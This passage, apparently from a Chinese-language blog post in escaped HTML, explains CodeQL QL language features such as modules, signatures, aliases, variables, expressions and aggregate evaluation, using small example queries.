href=\"#Final-extensions\" class=\"headerlink\" title=\"Final extensions\"></a>Final extensions</h3><p>类似于final关键字。</p>\n<h3 id=\"Non-extending-subtypes\"><a href=\"#Non-extending-subtypes\" class=\"headerlink\" title=\"Non-extending subtypes\"></a>Non-extending subtypes</h3><p>其实就是有点像接口，下面这个会报错。instanceof 声明的超类型中的字段和方法不会成为子类的一部分</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Foo</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">    Foo() &#123; <span class=\"built_in\">this</span> in [<span class=\"number\">1</span> .. <span class=\"number\">10</span>] &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    string <span class=\"title function_\">fooMethod</span><span class=\"params\">()</span> &#123; result = <span class=\"string\">&quot;foo&quot;</span> &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">class</span> <span class=\"title class_\">Bar</span> <span class=\"keyword\">instanceof</span> Foo &#123;</span><br><span class=\"line\">    string <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123; result = <span class=\"built_in\">super</span>.fooMethod() &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">select <span class=\"title function_\">any</span><span class=\"params\">(Bar b)</span>.fooMethod()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Interface</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">    Interface() &#123; <span class=\"built_in\">this</span> in [<span class=\"number\">1</span> .. <span class=\"number\">10</span>] &#125;</span><br><span class=\"line\">    string <span class=\"title function_\">foo</span><span class=\"params\">()</span> &#123; result = <span class=\"string\">&quot;&quot;</span> &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">class</span> <span class=\"title class_\">Foo</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">    Foo() &#123; <span class=\"built_in\">this</span> in [<span class=\"number\">1</span> .. <span class=\"number\">5</span>] &#125;</span><br><span class=\"line\">    string <span class=\"title function_\">foo</span><span class=\"params\">()</span> &#123; result = <span class=\"string\">&quot;foo&quot;</span> &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">class</span> <span class=\"title class_\">Bar</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Interface</span> <span class=\"keyword\">instanceof</span> Foo &#123;</span><br><span class=\"line\">    override string <span class=\"title function_\">foo</span><span class=\"params\">()</span> &#123; result = <span class=\"string\">&quot;bar&quot;</span> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">select <span class=\"title function_\">any</span><span class=\"params\">(Bar b)</span>.foo()  <span class=\"comment\">// 返回 bar</span></span><br><span class=\"line\"><span class=\"comment\">// select any(Foo f).foo()   // 返回foo</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h1 id=\"Modules\"><a href=\"#Modules\" class=\"headerlink\" title=\"Modules\"></a>Modules</h1><p>之类就给一个例子吧，太复杂的官方也没有给例子，这就是好多语言都有的一个东西。</p>\n<p><strong>OneTwoThreeLib.qll</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">OneTwoThree</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">    OneTwoThree() &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span> = <span class=\"number\">1</span> <span class=\"type\">or</span> <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">2</span> <span class=\"type\">or</span> <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">3</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">module</span> M &#123;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">OneTwo</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">OneTwoThree</span> &#123;</span><br><span class=\"line\">    OneTwo() &#123;</span><br><span class=\"line\">\t    <span class=\"built_in\">this</span> = <span class=\"number\">1</span> <span class=\"type\">or</span> <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">2</span></span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>OneTwoQuery.ql</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> OneTwoThreeLib</span><br><span class=\"line\"></span><br><span class=\"line\">from OneTwoThree ott</span><br><span class=\"line\"><span class=\"type\">where</span> <span class=\"variable\">ott</span> <span class=\"operator\">=</span> <span class=\"number\">1</span> <span class=\"type\">or</span> <span class=\"variable\">ott</span> <span class=\"operator\">=</span> <span class=\"number\">2</span></span><br><span class=\"line\">select ott</span><br></pre></td></tr></table></figure>\n\n<p>在对chat的逼问之下，还是把这个调用方法给问出来了。<br><strong>OneTwoQuery2.ql</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 导入库文件</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> OneTwoThreeLib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用 M 模块中的 OneTwo 类</span></span><br><span class=\"line\"></span><br><span class=\"line\">from M::OneTwo oneTwoInstance</span><br><span class=\"line\"></span><br><span class=\"line\">select oneTwoInstance, <span class=\"string\">&quot;Instance of OneTwo&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Signatures\"><a href=\"#Signatures\" class=\"headerlink\" title=\"Signatures\"></a>Signatures</h1><p>这个概念其实比较抽象。我暂时不想详细的写。这里就直接给官网的例子了。但是手边暂时没有具体使用的案例。</p>\n<h2 id=\"Predicate-signatures\"><a href=\"#Predicate-signatures\" class=\"headerlink\" title=\"Predicate signatures\"></a>Predicate signatures</h2><p>注意这个分号</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">signature <span class=\"type\">int</span> <span class=\"title function_\">operator</span><span class=\"params\">(<span class=\"type\">int</span> lhs, <span class=\"type\">int</span> rhs)</span>;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Type-signatures\"><a href=\"#Type-signatures\" class=\"headerlink\" title=\"Type signatures\"></a>Type signatures</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">signature <span class=\"keyword\">class</span> <span class=\"title class_\">ExtendsInt</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">signature <span class=\"keyword\">class</span> <span class=\"title class_\">CanBePrinted</span> &#123;</span><br><span class=\"line\">  string <span class=\"title function_\">toString</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Module-signatures\"><a href=\"#Module-signatures\" class=\"headerlink\" title=\"Module signatures\"></a>Module signatures</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">signature <span class=\"keyword\">module</span> MSig &#123;</span><br><span class=\"line\">  <span class=\"keyword\">class</span> <span class=\"title class_\">T</span>;</span><br><span class=\"line\">  predicate <span class=\"title function_\">restriction</span><span class=\"params\">(T t)</span>;</span><br><span class=\"line\">  <span class=\"keyword\">default</span> string <span class=\"title function_\">descr</span><span class=\"params\">(T t)</span> &#123; result = <span class=\"string\">&quot;default&quot;</span> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">module</span> Module <span class=\"keyword\">implements</span> <span class=\"title class_\">MSig</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">newtype</span> <span class=\"variable\">T</span> <span class=\"operator\">=</span> A() or <span class=\"title function_\">B</span><span class=\"params\">()</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  predicate <span class=\"title function_\">restriction</span><span class=\"params\">(T t)</span> &#123; t = A() &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Parameterized-module-signatures\"><a href=\"#Parameterized-module-signatures\" class=\"headerlink\" title=\"Parameterized module signatures\"></a>Parameterized module signatures</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">signature <span class=\"keyword\">class</span> <span class=\"title class_\">NodeSig</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">signature <span class=\"keyword\">module</span> EdgeSig&lt;NodeSig Node&gt; &#123;</span><br><span class=\"line\">  predicate <span class=\"title function_\">apply</span><span class=\"params\">(Node src, Node dst)</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">module</span> Reachability&lt;NodeSig Node, EdgeSig&lt;Node&gt; Edge&gt; &#123;</span><br><span class=\"line\">  Node <span class=\"title function_\">reachableFrom</span><span class=\"params\">(Node src)</span> &#123;</span><br><span class=\"line\">    Edge::apply+(src, result)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Aliases\"><a href=\"#Aliases\" class=\"headerlink\" title=\"Aliases\"></a>Aliases</h1><h2 id=\"Defining-an-alias\"><a href=\"#Defining-an-alias\" class=\"headerlink\" title=\"Defining an alias\"></a>Defining an alias</h2><h3 id=\"Module-aliases\"><a href=\"#Module-aliases\" class=\"headerlink\" title=\"Module aliases\"></a>Module aliases</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">module</span> <span class=\"variable\">ModAlias</span> <span class=\"operator\">=</span> ModuleName;</span><br></pre></td></tr></table></figure>\n\n<p>下面这个会弃用oldversion。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deprecated <span class=\"type\">module</span> <span class=\"variable\">OldVersion</span> <span class=\"operator\">=</span> NewVersion;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Type-aliases\"><a href=\"#Type-aliases\" class=\"headerlink\" title=\"Type aliases\"></a>Type aliases</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TypeAlias</span> = TypeName;</span><br></pre></td></tr></table></figure>\n\n<p>你可以使用别名将基本类型boolean的名称缩写为Bool：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Bool</span> = <span class=\"type\">boolean</span>;</span><br></pre></td></tr></table></figure>\n\n<p>在OneTwoThreeLib中使用模块M中定义的类OneTwoThreeLib.qll，你可以创建一个别名来使用更短的名称OT</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> OneTwoThreeLib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">OT</span> = M::OneTwo;</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">from OT ot</span><br><span class=\"line\">select ot</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Predicate-aliases\"><a href=\"#Predicate-aliases\" class=\"headerlink\" title=\"Predicate aliases\"></a>Predicate aliases</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getSuccessor</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">  result = i + <span class=\"number\">1</span> and</span><br><span class=\"line\">  i in [<span class=\"number\">1</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以为这个谓语设置一个这样的别名。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">predicate</span> <span class=\"variable\">succ</span> <span class=\"operator\">=</span> getSuccessor/<span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Strong-and-weak-aliases\"><a href=\"#Strong-and-weak-aliases\" class=\"headerlink\" title=\"Strong and weak aliases\"></a>Strong and weak aliases</h3><p>有annotation 注解的是 Strong aliases。来自相同module&#x2F;type&#x2F;predicate的weak aliases定义之间的别名歧义是允许的，但来自不同Strong aliases定义之间的别名歧义是无效的QL。</p>\n<blockquote>\n<p>Every alias definition is either <strong>strong</strong> or <strong>weak</strong>. An alias definition is <strong>strong</strong> if and only if it is a <a href=\"https://codeql.github.com/docs/ql-language-reference/aliases/#type-aliases\">type alias</a> definition with <a href=\"https://codeql.github.com/docs/ql-language-reference/annotations/#annotations\">annotation</a> <code>final</code>. During <a href=\"https://codeql.github.com/docs/ql-language-reference/name-resolution/#name-resolution\">name resolution</a>, ambiguity between aliases from <strong>weak</strong> alias definitions for the same module&#x2F;type&#x2F;predicate is allowed, but ambiguity between between aliases from distinct <strong>strong</strong> alias definitions is invalid QL. Likewise, for the purpose of applicative instantiation of <a href=\"https://codeql.github.com/docs/ql-language-reference/modules/#parameterized-modules\">parameterised modules</a> and :ref:&#96;parameterised module signatures <parameterized-module-signatures>, aliases from <strong>weak</strong> alias definitions for instantiation arguments do not result in separate instantiations, but aliases from <strong>strong</strong> alias definitions for instantiation arguments do.</p>\n</blockquote>\n<h1 id=\"Variables\"><a href=\"#Variables\" class=\"headerlink\" title=\"Variables\"></a>Variables</h1><h2 id=\"Declaring-a-variable\"><a href=\"#Declaring-a-variable\" class=\"headerlink\" title=\"Declaring a variable\"></a>Declaring a variable</h2><p>其实前面就一只在遇见了。声明，赋值，输出。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from <span class=\"type\">int</span> i</span><br><span class=\"line\"><span class=\"type\">where</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">10</span></span><br><span class=\"line\">select i</span><br><span class=\"line\">  </span><br><span class=\"line\">from <span class=\"type\">int</span> i</span><br><span class=\"line\">where i in [<span class=\"number\">0</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">select i</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Free-and-bound-variables\"><a href=\"#Free-and-bound-variables\" class=\"headerlink\" title=\"Free and bound variables\"></a>Free and bound variables</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;hello&quot;</span>.indexOf(<span class=\"string\">&quot;l&quot;</span>)</span><br><span class=\"line\">min(<span class=\"type\">float</span> f | f in [-<span class=\"number\">3</span> .. <span class=\"number\">3</span>])</span><br><span class=\"line\">(i + <span class=\"number\">7</span>) * <span class=\"number\">3</span></span><br><span class=\"line\">x.sqrt()</span><br></pre></td></tr></table></figure>\n\n<p>第一个没有 variables  ，值是2</p>\n<p>第二个<strong>bound variable</strong>  ，值恒为3</p>\n<p>第三个<strong>free variables</strong> ，i 的值影响着整体的值。表达式是否成立取决于i的值。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;hello&quot;</span>.indexOf(<span class=\"string\">&quot;l&quot;</span>) = <span class=\"number\">1</span></span><br><span class=\"line\">min(<span class=\"type\">float</span> f | f in [-<span class=\"number\">3</span> .. <span class=\"number\">3</span>]) = -<span class=\"number\">3</span></span><br><span class=\"line\">(i + <span class=\"number\">7</span>) * <span class=\"number\">3</span> <span class=\"keyword\">instanceof</span> <span class=\"type\">int</span></span><br><span class=\"line\"><span class=\"title function_\">exists</span><span class=\"params\">(<span class=\"type\">float</span> y | x.sqrt()</span> = y)</span><br></pre></td></tr></table></figure>\n\n<p>第一个永远不成立。</p>\n<p>第二个永远成立</p>\n<p>第三个可能成立</p>\n<p>第四个单y为负数时永远不成立</p>\n<h1 id=\"Expressions\"><a href=\"#Expressions\" class=\"headerlink\" title=\"Expressions\"></a>Expressions</h1><h2 id=\"Literals\"><a href=\"#Literals\" class=\"headerlink\" title=\"Literals\"></a>Literals</h2><p>Integer literals</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0</span><br><span class=\"line\">42</span><br><span class=\"line\">-2048</span><br></pre></td></tr></table></figure>\n\n<p>Float literals</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2.0</span><br><span class=\"line\">123.456</span><br><span class=\"line\">-100.5</span><br></pre></td></tr></table></figure>\n\n<p>等等</p>\n<h2 id=\"Parenthesized-括号-expressions\"><a href=\"#Parenthesized-括号-expressions\" class=\"headerlink\" title=\"Parenthesized(括号) expressions\"></a>Parenthesized(括号) expressions</h2><h2 id=\"Ranges\"><a href=\"#Ranges\" class=\"headerlink\" title=\"Ranges\"></a>Ranges</h2><p>其实前面也见到一些了</p>\n<p><code>[3 .. 7]</code>表示的是3到7的整数</p>\n<h2 id=\"Set-literal-expressions\"><a href=\"#Set-literal-expressions\" class=\"headerlink\" title=\"Set literal expressions\"></a>Set literal expressions</h2><p><code>[2, 3, 5, 7, 11, 13, 17, 19, 23, 29]</code> 是一个集合参数</p>\n<h2 id=\"Super-expressions\"><a href=\"#Super-expressions\" class=\"headerlink\" title=\"Super expressions\"></a>Super expressions</h2><p>这个直接看例子，其实就是super.  然后找父类。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">A</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">  A() &#123; <span class=\"built_in\">this</span> = <span class=\"number\">1</span> &#125;</span><br><span class=\"line\">  <span class=\"type\">int</span> <span class=\"title function_\">getANumber</span><span class=\"params\">()</span> &#123; result = <span class=\"number\">2</span> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">B</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">  B() &#123; <span class=\"built_in\">this</span> = <span class=\"number\">1</span> &#125;</span><br><span class=\"line\">  <span class=\"type\">int</span> <span class=\"title function_\">getANumber</span><span class=\"params\">()</span> &#123; result = <span class=\"number\">3</span> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">C</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">A</span>, B &#123;</span><br><span class=\"line\">  <span class=\"comment\">// Need to define `int getANumber()`; otherwise it would be ambiguous</span></span><br><span class=\"line\">  override <span class=\"type\">int</span> <span class=\"title function_\">getANumber</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    result = B.<span class=\"built_in\">super</span>.getANumber()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from C c</span><br><span class=\"line\">select c, c.getANumber()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Calls-to-predicates\"><a href=\"#Calls-to-predicates\" class=\"headerlink\" title=\"Calls to predicates\"></a>Calls to predicates</h2><p>调用类的方法</p>\n<p>例如 a.getAChild() 是调用的 a 的谓词 getAChild()</p>\n<h2 id=\"Aggregations\"><a href=\"#Aggregations\" class=\"headerlink\" title=\"Aggregations\"></a>Aggregations</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;aggregate&gt;(&lt;variable declarations&gt; | &lt;formula&gt; | &lt;expression&gt;)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 内容超过500行的文件</span></span><br><span class=\"line\">count(File f | f.getTotalNumberOfLines() &gt; <span class=\"number\">500</span> | f)   </span><br><span class=\"line\"><span class=\"comment\">// 寻找函数最多的js文件。  </span></span><br><span class=\"line\">max(File f | f.getExtension() = <span class=\"string\">&quot;js&quot;</span> | f.getBaseName() order by f.getTotalNumberOfLines(), f.getNumberOfLinesOfCode())</span><br><span class=\"line\"><span class=\"comment\">// 逐个字符比较 返回 De Morgan</span></span><br><span class=\"line\">min(string s | s = <span class=\"string\">&quot;Tarski&quot;</span> <span class=\"type\">or</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Dedekind&quot;</span> <span class=\"type\">or</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;De Morgan&quot;</span> | s)</span><br><span class=\"line\"><span class=\"comment\">// 返回36，等等吧，还有很多。</span></span><br><span class=\"line\">sum(<span class=\"type\">int</span> i, <span class=\"type\">int</span> j | i = [<span class=\"number\">0</span> .. <span class=\"number\">2</span>] <span class=\"type\">and</span> <span class=\"variable\">j</span> <span class=\"operator\">=</span> [<span class=\"number\">3</span> .. <span class=\"number\">5</span>] | i * j)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Evaluation-of-aggregates\"><a href=\"#Evaluation-of-aggregates\" class=\"headerlink\" title=\"Evaluation of aggregates\"></a>Evaluation of aggregates</h3><p>以这个为例</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select <span class=\"title function_\">sum</span><span class=\"params\">(<span class=\"type\">int</span> i, <span class=\"type\">int</span> j |</span></span><br><span class=\"line\"><span class=\"params\">    exists(string s | s = <span class=\"string\">&quot;hello&quot;</span>.charAt(i)</span>) and </span><br><span class=\"line\">    <span class=\"title function_\">exists</span><span class=\"params\">(string s | s = <span class=\"string\">&quot;world!&quot;</span>.charAt(j)</span>) </span><br><span class=\"line\">    | i)</span><br></pre></td></tr></table></figure>\n\n<p>步骤</p>\n<ol>\n<li><p><strong>确定输入变量</strong>：这是聚合表达式中声明的变量，包括在聚合内声明的变量和在聚合外部使用的变量。</p>\n</li>\n<li><p><strong>生成所有可能的元组（组合）</strong>：这些元组是输入变量的所有可能值的组合，必须满足给定的条件公式。</p>\n</li>\n<li><p>**应用 <expression>**：对每个元组应用<expression>，并收集生成的值（可能有多个不同的值）。</p>\n</li>\n<li><p><strong>应用 aggregates function</strong>：使用 aggregates function（如 sum、count 等）对第3步中生成的值进行处理，计算最终结果。</p>\n</li>\n</ol>\n<p><strong>1. 确定输入变量：</strong></p>\n<p>•输入变量是 i 和 j，分别代表 “hello” 和 “world!” 中的字符位置。</p>\n<p><strong>2. 生成所有可能的元组：</strong></p>\n<p>•我们通过 exists(string s | s &#x3D; “hello”.charAt(i)) 和 exists(string s | s &#x3D; “world!”.charAt(j)) 来生成所有可能的 (i, j) 对，表示字符串 “hello” 和 “world!” 中字符的位置。</p>\n<p>•”hello” 有 5 个字符（0, 1, 2, 3, 4），而 “world!” 有 6 个字符（0, 1, 2, 3, 4, 5）。</p>\n<p>•所以所有可能的 (i, j) 对是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(0, 0), (0, 1), (0, 2), (0, 3), (0, 4), (0, 5),</span><br><span class=\"line\">(1, 0), (1, 1), (1, 2), (1, 3), (1, 4), (1, 5),</span><br><span class=\"line\">(2, 0), (2, 1), (2, 2), (2, 3), (2, 4), (2, 5),</span><br><span class=\"line\">(3, 0), (3, 1), (3, 2), (3, 3), (3, 4), (3, 5),</span><br><span class=\"line\">(4, 0), (4, 1), (4, 2), (4, 3), (4, 4), (4, 5)</span><br></pre></td></tr></table></figure>\n\n<p><strong>3. 应用<expression>：</strong></p>\n<p>•在这个查询中，聚合表达式是 i。我们从每个元组中选择 i 的值。</p>\n<p>•例如，所有 30 个元组中，i 的值会分别为：</p>\n<p><code>0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 3, 3, 3, 3, 